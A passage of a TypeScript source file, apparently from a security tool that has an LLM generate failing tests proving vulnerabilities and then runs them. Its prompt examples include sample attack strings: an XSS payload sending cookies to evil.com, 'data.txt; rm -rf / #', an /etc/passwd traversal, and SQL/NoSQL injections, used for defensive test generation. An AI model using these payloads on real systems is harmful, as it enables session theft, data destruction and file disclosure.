        const ext = this.getLanguageExtension(framework.name);
        const tempFile = path.join(tempDir, `test_${Date.now()}${ext}`);
        fs.writeFileSync(tempFile, testSuite.redTests[0].testCode, 'utf8');

        logger.info(`Wrote test to temp file: ${tempFile}`);

        // 3. Validate syntax
        try {
          await this.validateSyntax(tempFile, framework);
          logger.info('✓ Syntax validation passed');
        } catch (syntaxError) {
          logger.warn(`✗ Syntax error on attempt ${attempt}:`, syntaxError);
          previousAttempts.push({
            attempt,
            error: 'SyntaxError',
            errorMessage: syntaxError instanceof Error ? syntaxError.message : String(syntaxError),
            timestamp: new Date().toISOString()
          });
          continue; // Retry with error context
        }

        // 4. Run test (must FAIL on vulnerable code)
        try {
          const testResult = await this.runTest(tempFile, framework);

          if (testResult.passed) {
            logger.warn(`✗ Test passed unexpectedly on attempt ${attempt} (should fail on vulnerable code)`);
            previousAttempts.push({
              attempt,
              error: 'TestPassedUnexpectedly',
              errorMessage: 'Test passed when it should fail to demonstrate vulnerability',
              timestamp: new Date().toISOString()
            });
            continue; // Retry with "make it fail" feedback
          }

          // 5. Check for regressions (existing tests should still pass)
          if (testResult.existingTestsFailed) {
            logger.warn(`✗ Existing tests failed on attempt ${attempt} (regression detected)`);
            previousAttempts.push({
              attempt,
              error: 'ExistingTestsRegression',
              errorMessage: `Existing tests failed: ${testResult.failedTests?.join(', ')}`,
              timestamp: new Date().toISOString()
            });
            continue; // Retry with regression context
          }

          // Success! Test is valid
          logger.info(`✓ Test generation successful on attempt ${attempt}`);
          return testSuite;

        } catch (testError) {
          logger.error(`Error running test on attempt ${attempt}:`, testError);
          previousAttempts.push({
            attempt,
            error: 'TestExecutionError',
            errorMessage: testError instanceof Error ? testError.message : String(testError),
            timestamp: new Date().toISOString()
          });
          continue;
        }

      } catch (error) {
        logger.error(`Error during test generation attempt ${attempt}:`, error);
        previousAttempts.push({
          attempt,
          error: 'GenerationError',
          errorMessage: error instanceof Error ? error.message : String(error),
          timestamp: new Date().toISOString()
        });
      }
    }

    // All retries exhausted - tag issue and return null
    logger.warn(`Failed to generate valid test after ${maxAttempts} attempts`);
    await this.tagIssueNotValidated(vulnerability, previousAttempts);
    return null;
  }

  /**
   * Generate test using LLM with vulnerability context and retry feedback
   */
  private async generateTestWithLLM(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework
  ): Promise<TestSuite> {
    // Build LLM prompt with realistic vulnerability examples
    const prompt = this.buildLLMPrompt(vulnerability, targetTestFile, previousAttempts, framework);

    // Use existing TestGeneratingSecurityAnalyzer for LLM interaction
    const aiConfig: AIConfig = {
      provider: 'anthropic',
      apiKey: this.config.aiProvider.apiKey,
      model: this.config.aiProvider.model,
      temperature: 0.2,
      maxTokens: this.config.aiProvider.maxTokens,
      useVendedCredentials: this.config.aiProvider.useVendedCredentials
    };

    const testAnalyzer = new TestGeneratingSecurityAnalyzer(aiConfig);

    // Create a mock issue context for the analyzer
    const mockIssue: IssueContext = {
      id: `vuln-${Date.now()}`,
      number: 0,
      title: vulnerability.description,
      body: prompt,
      labels: [],
      assignees: [],
      repository: {
        owner: 'test',
        name: 'test',
        fullName: 'test/test',
        defaultBranch: 'main'
      },
      source: 'github',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      metadata: {}
    };

    const codebaseFiles = new Map<string, string>();
    codebaseFiles.set(targetTestFile.path, targetTestFile.content);

    const result = await testAnalyzer.analyzeWithTestGeneration(
      mockIssue,
      this.config,
      codebaseFiles
    );

    if (!result.generatedTests?.testSuite) {
      throw new Error('LLM failed to generate test suite');
    }

    // Convert to our TestSuite format
    const redTests = result.generatedTests.testSuite.redTests
      || (result.generatedTests.testSuite.red ? [result.generatedTests.testSuite.red] : []);

    return {
      framework: framework.name,
      testFile: targetTestFile.path,
      redTests
    };
  }

  /**
   * Build LLM prompt with vulnerability context and retry feedback
   */
  private buildLLMPrompt(
    vulnerability: Vulnerability,
    targetTestFile: TestFileContext,
    previousAttempts: AttemptHistory[],
    framework: TestFramework
  ): string {
    const realisticExamples = this.getRealisticVulnerabilityExample(vulnerability.type);

    let prompt = `Generate a RED test for a security vulnerability.

VULNERABILITY: ${vulnerability.description}
TYPE: ${vulnerability.type}
LOCATION: ${vulnerability.location}
ATTACK VECTOR: ${vulnerability.attackVector}
${vulnerability.vulnerablePattern ? `VULNERABLE PATTERN: ${vulnerability.vulnerablePattern}` : ''}
${vulnerability.source ? `SOURCE: ${vulnerability.source}` : ''}

${realisticExamples}

TARGET TEST FILE: ${targetTestFile.path}
FRAMEWORK: ${framework.name}

TARGET FILE CONTENT (for context):
\`\`\`
${targetTestFile.content}
\`\`\`

YOUR TASK:
Generate test code that:
1. Uses the attack vector: ${vulnerability.attackVector}
2. FAILS on vulnerable code (proves exploit works)
3. PASSES after fix is applied
4. Reuses existing setup blocks from target file
5. Follows ${framework.name} conventions
6. Is COMPLETELY SELF-CONTAINED — do NOT use require() or import to load target modules.
   Instead, INLINE the vulnerable function directly in the test code so it can execute anywhere.
   Tests that require() modules that don't exist in the test directory will crash with MODULE_NOT_FOUND.`;

    if (previousAttempts.length > 0) {
      prompt += '\n\nPREVIOUS ATTEMPTS (learn from these errors):';
      for (const attempt of previousAttempts) {
        prompt += `\n- Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`;
      }

      // Add specific guidance based on error types
      const lastError = previousAttempts[previousAttempts.length - 1].error;
      if (lastError === 'SyntaxError') {
        prompt += `\n\nIMPORTANT: Fix the syntax error. Ensure valid ${framework.name} syntax.`;
      } else if (lastError === 'TestPassedUnexpectedly') {
        prompt += '\n\nIMPORTANT: Make the test MORE AGGRESSIVE. It must FAIL on vulnerable code.';
      } else if (lastError === 'ExistingTestsRegression') {
        prompt += '\n\nIMPORTANT: Don\'t break existing tests. Avoid modifying shared state or setup blocks.';
      }
    }

    return prompt;
  }

  /**
   * Get realistic vulnerability examples from Phase 0 documentation
   */
  private getRealisticVulnerabilityExample(vulnerabilityType: string): string {
    // Map to examples from REALISTIC-VULNERABILITY-EXAMPLES.md
    const examples: Record<string, string> = {
      'sql_injection': `REAL-WORLD EXAMPLE (RailsGoat):
Pattern: User.where("id = '\#{params[:user][:id]}'")
Attack: 5') OR admin = 't' --'
Impact: Privilege escalation to admin
CWE: CWE-89`,

      'nosql_injection': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: db.accounts.find({username: username, password: password})
Attack: {"username": "admin", "password": {"$gt": ""}}
Impact: Authentication bypass
CWE: CWE-943`,

      'xss': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
Impact: Session hijacking
CWE: CWE-79`,

      'command_injection': `REAL-WORLD EXAMPLE:
Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
Attack: data.txt; rm -rf / #
Impact: System compromise
CWE: CWE-78`,

      'path_traversal': `REAL-WORLD EXAMPLE:
Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
Attack: ../../../etc/passwd
Impact: Read sensitive files
CWE: CWE-22`
    };

    return examples[vulnerabilityType.toLowerCase()] || `Vulnerability type: ${vulnerabilityType}`;
  }

  /**
   * Detect framework from test file path
   */
  private detectFrameworkFromPath(testPath: string): TestFramework {
    const fileName = path.basename(testPath);
    const ext = path.extname(testPath);

    // Detect by file naming conventions
    if (fileName.includes('.spec.')) {
      if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
      if (ext === '.ts' || ext === '.js') return { name: 'jest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
    }

    if (fileName.includes('.test.')) {
      if (ext === '.ts' || ext === '.js') return { name: 'vitest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
      if (ext === '.php') return { name: 'phpunit', syntaxCheckCommand: 'php -l', testCommand: 'vendor/bin/phpunit' };
    }

    if (ext === '.py') return { name: 'pytest', syntaxCheckCommand: 'python -m py_compile', testCommand: 'pytest' };
    if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
    if (ext === '.java') return { name: 'junit5', syntaxCheckCommand: 'javac', testCommand: 'mvn test' };
    if (ext === '.ex' || ext === '.exs') return { name: 'exunit', syntaxCheckCommand: 'elixir -c', testCommand: 'mix test' };

    // Default to generic
    return { name: 'generic', syntaxCheckCommand: 'echo "No syntax check"', testCommand: 'echo "No test runner"' };
  }

  /**
   * Get file extension for language
   */
  private getLanguageExtension(frameworkName: string): string {
    const extensions: Record<string, string> = {
      'rspec': '.rb',
      'minitest': '.rb',
      'pytest': '.py',
      'phpunit': '.php',
      'pest': '.php',
      'jest': '.js',
      'vitest': '.ts',
      'mocha': '.js',
      'junit5': '.java',
      'testng': '.java',
      'exunit': '.exs'
    };

    return extensions[frameworkName.toLowerCase()] || '.js';
  }

  /**
   * Validate syntax of test file
   */
  private async validateSyntax(testFile: string, framework: TestFramework): Promise<void> {
    if (!framework.syntaxCheckCommand) {
      logger.debug('No syntax check command available');
      return;
    }

    try {
      const command = `${framework.syntaxCheckCommand} ${testFile}`;
      execSync(command, { cwd: this.repoPath, encoding: 'utf8' });
    } catch (error: any) {
      throw new Error(`Syntax validation failed: ${error.message}`);
    }
  }

  /**
   * Run test and check results
   */
  private async runTest(testFile: string, framework: TestFramework): Promise<{
    passed: boolean;
    existingTestsFailed: boolean;
    failedTests?: string[];
  }> {
    if (!framework.testCommand) {
      logger.warn('No test command available, skipping test execution');
      return { passed: false, existingTestsFailed: false };
    }

    try {
      const command = `${framework.testCommand} ${testFile}`;
      const output = execSync(command, { cwd: this.repoPath, encoding: 'utf8' });

      // Parse output to determine if test passed
      // This is a simplified check - real implementation would parse framework-specific output
      const passed = output.includes('0 failures') || output.includes('All tests passed');

      return {
        passed,
        existingTestsFailed: false
      };
    } catch (error: any) {
      // Test failed (which is good for RED tests!)
      // Check if it's just the new test or if existing tests also failed
      const output = error.stdout || error.message || '';

      // Simple heuristic: if output mentions multiple failures, check if existing tests failed
      const failureCount = (output.match(/failed/gi) || []).length;
      const existingTestsFailed = failureCount > 1;

      return {
        passed: false,
        existingTestsFailed,
        failedTests: existingTestsFailed ? this.extractFailedTestNames(output) : undefined
      };
    }
  }

  /**
   * Extract failed test names from test output
   */
  private extractFailedTestNames(output: string): string[] {
    const failedTests: string[] = [];

    // Common patterns for failed test output
    const patterns = [
      /FAIL\s+(.+)/g,
      /✗\s+(.+)/g,
      /Failed:\s+(.+)/g,
      /\d+\)\s+(.+)/g
    ];

    for (const pattern of patterns) {
      const matches = output.matchAll(pattern);
      for (const match of matches) {
        if (match[1]) {
          failedTests.push(match[1].trim());
        }
      }
    }

    return failedTests.slice(0, 5); // Return first 5 for brevity
  }

  /**
   * Tag issue as "not-validated" after retry exhaustion
   */
  private async tagIssueNotValidated(
    vulnerability: Vulnerability,
    previousAttempts: AttemptHistory[]
  ): Promise<void> {
    // This would need an issue number, which we don't have in the current flow
    // For now, log the failure
    logger.error(`Failed to validate vulnerability after ${previousAttempts.length} attempts`);
    logger.error(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.error('Attempt history:');
    for (const attempt of previousAttempts) {
      logger.error(`  - Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`);
    }

    // In a real implementation, this would:
    // 1. Find or create a GitHub issue for this vulnerability
    // 2. Add "not-validated" label
    // 3. Add comment with attempt history
  }

  /**
   * Scan repository for test files
   * RFC-060-AMENDMENT-001: Comprehensive pattern coverage for all supported languages
   */
  private async scanTestFiles(framework?: string): Promise<string[]> {
    const testFiles: string[] = [];

    // Use shared constants for pattern matching and directory exclusion
    const excludeDirs = EXCLUDED_DIRECTORIES;
    const testPatterns = TEST_FILE_PATTERNS;

    /**
     * Recursively scan directory for test files using Node.js fs module.
     * More reliable than shell 'find' command in test environments.
     */
    const scanDirectory = (dir: string): void => {
      try {
        const entries = fs.readdirSync(dir, { withFileTypes: true });

        for (const entry of entries) {
          const fullPath = path.join(dir, entry.name);

          if (entry.isDirectory()) {
            // Skip excluded directories
            if (!excludeDirs.has(entry.name)) {
              scanDirectory(fullPath);
            }
          } else if (entry.isFile()) {
            // Check if file matches any test pattern
            const fileName = entry.name;
            if (testPatterns.some(pattern => pattern.test(fileName))) {
              testFiles.push(path.relative(this.repoPath, fullPath));
            }
          }
        }
      } catch (error) {
        // Directory might not exist or be unreadable, skip it
      }
    };

    scanDirectory(this.repoPath);

    // Remove duplicates and return
    return [...new Set(testFiles)];
  }

  /**
   * Format test suite for backend API
   */
  private formatTestSuite(testContent: any): any {
    // If already in correct format, return as-is
    if (testContent.redTests && Array.isArray(testContent.redTests)) {
      return testContent;
    }

    // If it has a single 'red' test, wrap it in redTests array
    if (testContent.red) {
      return {
        redTests: [testContent.red]
      };
    }

    // If it's a raw test suite object with testName/testCode, wrap it
    if (testContent.testName && testContent.testCode) {
      return {
        redTests: [testContent]
      };
    }

    // Fallback: return as-is and let backend handle it
    return testContent;
  }

  /**
   * Detect programming language from file path
   */
  private detectLanguage(filePath: string): string {
    const ext = path.extname(filePath).toLowerCase();

    const languageMap: Record<string, string> = {
      '.rb': 'ruby',
      '.js': 'javascript',
      '.ts': 'typescript',
      '.py': 'python',
      '.java': 'java',
      '.php': 'php',
      '.ex': 'elixir',
      '.exs': 'elixir'
    };

    return languageMap[ext] || 'javascript'; // Default to JavaScript
  }

  /**
   * Detect test framework from source file extension
   */
  private detectFrameworkFromFile(filePath: string): string {
    const ext = path.extname(filePath).toLowerCase();

    // Map source file extensions to likely test frameworks
    const frameworkMap: Record<string, string> = {
      '.rb': 'rspec',
      '.js': 'vitest',
      '.ts': 'vitest',
      '.py': 'pytest',
      '.java': 'junit5',
      '.php': 'phpunit',
      '.ex': 'exunit',
      '.exs': 'exunit'
    };

    return frameworkMap[ext] || 'vitest'; // Default to vitest for JS/TS projects
  }
}